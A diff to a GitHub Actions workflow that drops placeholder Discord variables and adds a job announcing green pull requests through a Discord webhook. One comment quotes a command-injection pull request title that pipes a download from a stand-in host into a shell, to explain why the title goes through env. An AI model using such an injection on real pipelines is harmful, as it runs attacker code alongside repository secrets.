@@ -29,13 +29,6 @@ permissions:
   # requirement changed underneath. Read-only, and only what that one call needs.
   pull-requests: read
 
-env:
-  # src/service/discord_listener.py exits during import when these are unset,
-  # which kills pytest collection outright. Placeholders, not secrets — nothing
-  # in the suite connects to Discord.
-  DISCORD_BOT_TOKEN: "ci-placeholder-token"
-  DISCORD_CHANNEL_ID: "123456789"
-
 jobs:
   # GitHub filters paths per *workflow*, not per job, so the obvious
   # `paths-ignore: ["**.md"]` would also switch off the secret scan and the
@@ -244,3 +237,49 @@ jobs:
       # invisible on an already-configured machine.
       - name: Clean-room verification
         run: ./scripts/verify_clean_install.sh
+
+  # The other half of DG-355: Discord stopped being somewhere to answer and
+  # became somewhere to be told. This is the "PR is ready" half of that, sent
+  # from CI rather than from a daemon watching a socket.
+  #
+  # Deliberately `needs` every gate and `if: success()`. A notification saying a
+  # PR is ready for review, sent while its tests are red, trains the reader to
+  # ignore the next one.
+  #
+  # `continue-on-error` because a notification is never worth failing a build
+  # over — and `core.notify` exits 0 with its reason on stderr in any case, so
+  # an unset DISCORD_WEBHOOK_URL logs "not sent" rather than breaking a fork's
+  # CI, which cannot see repository secrets at all.
+  notify:
+    name: notify
+    runs-on: ubuntu-latest
+    needs: [changes, test, security, clean-install]
+    # Not `success()`: a docs-only pull request *skips* the three code gates,
+    # and a skipped dependency is not a successful one — the notification would
+    # silently never be sent for exactly the changes that most want reviewing.
+    # This says "nothing failed" instead, which is the actual condition.
+    if: >-
+      github.event_name == 'pull_request' && !cancelled()
+      && !contains(needs.*.result, 'failure')
+    continue-on-error: true
+    steps:
+      - uses: actions/checkout@v4
+      - uses: astral-sh/setup-uv@v5
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.13"
+
+      # The title and URL arrive through `env`, never interpolated into the
+      # script. `${{ }}` is substituted before the shell sees the line, so a
+      # pull request titled `"; curl evil.sh | sh; #` would run as this job —
+      # with the repository's secrets in its environment. Anyone can open a
+      # pull request; that makes the title attacker-controlled input.
+      - name: Say the PR is ready
+        env:
+          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
+          DRUNKEN_DISCORD_WEBHOOK: env://DISCORD_WEBHOOK_URL
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_URL: ${{ github.event.pull_request.html_url }}
+        run: |
+          uv run python -m core.notify \
+            "$PR_TITLE — checks green, ready for review" --link "$PR_URL"
